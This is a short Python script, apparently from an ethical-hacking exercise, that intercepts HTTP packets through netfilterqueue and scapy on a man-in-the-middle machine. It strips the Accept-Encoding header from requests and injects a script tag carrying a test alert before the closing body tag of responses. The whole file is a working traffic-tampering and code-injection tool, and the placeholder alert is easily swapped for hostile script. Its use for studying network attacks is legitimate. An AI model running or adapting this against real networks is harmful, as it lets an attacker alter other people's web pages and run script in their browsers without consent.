#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy
import re

def setLoad(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	# del scapyPacket[scapy.TCP].len
	del packet[scapy.TCP].chksum
	return packet

def processPacket(packet):
	scapyPacket = scapy.IP(packet.get_payload())
	if scapyPacket.haslayer(scapy.Raw):
		load = scapyPacket[scapy.Raw].load
		if scapyPacket[scapy.TCP].dport == 80:
			print("[+] Request")
			load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
			newPacket = setLoad(scapyPacket, load)
			packet.set_payload(str(newPacket))

		elif scapyPacket[scapy.TCP].sport == 80:
			print("[+] Response") 
			load = load.replace("</body>","<script>alert('test');</script></body>")
			newPacket = setLoad(scapyPacket, load)
			packet.set_payload(str(newPacket))


	packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, processPacket)
queue.run()